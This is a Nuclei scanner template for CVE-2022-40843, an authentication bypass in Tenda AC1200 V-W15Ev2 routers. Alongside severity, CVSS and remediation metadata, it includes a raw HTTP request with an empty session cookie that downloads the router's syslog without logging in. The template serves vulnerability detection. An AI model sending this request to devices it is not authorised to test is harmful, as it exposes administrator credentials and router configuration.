id: CVE-2022-40843

info:
  name: Tenda AC1200 V-W15Ev2 - Authentication Bypass
  author: gy741
  severity: medium
  description: |
    The Tenda AC1200 V-W15Ev2 router is affected by improper authorization/improper session management. The software does not perform or incorrectly perform an authorization check when a user attempts to access a resource or perform an action. This allows the router's login page to be bypassed. The improper validation of user sessions/authorization can lead to unauthenticated attackers having the ability to read the router's file, which contains the MD5 password of the Administrator's user account. This vulnerability exists within the local web and hosted remote management console.
  impact: |
    Successful exploitation of this vulnerability can lead to unauthorized configuration changes, network compromise, and potential access to sensitive information.
  remediation: |
    Apply the latest firmware update provided by the vendor to fix the authentication bypass vulnerability.
  reference:
    - https://boschko.ca/tenda_ac1200_router
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-40843
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 4.9
    cve-id: CVE-2022-40843
    cwe-id: CWE-287
    epss-score: 0.40937
    epss-percentile: 0.97197
    cpe: cpe:2.3:o:tenda:w15e_firmware:15.11.0.10\(1576\):*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: tenda
    product: w15e_firmware
  tags: cve2022,cve,tenda,auth-bypass,router,iot

http:
  - raw:
      - |
        GET /goform/downloadSyslog/syslog.log HTTP/1.1
        Host: {{Hostname}}
        Cookie: W15Ev2_user=

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - '^0\d{3}$'

      - type: word
        part: body
        words:
          - "[system]"
          - "[error]"
          - "[wan1]"
        condition: or

      - type: word
        part: header
        words:
          - "Content-type: config/conf"

      - type: status
        status:
          - 200
# digest: 4a0a00473045022100d2aad06ddab3ccd6e666e1cc53a8974249101d2a25b364fb4b96543189e71c450220673c9fddd115564cbbe4faa07d9de703be2cd6af8eede2a57e4408e9ba10d5af:922c64590222798bb761d5b6d8e72950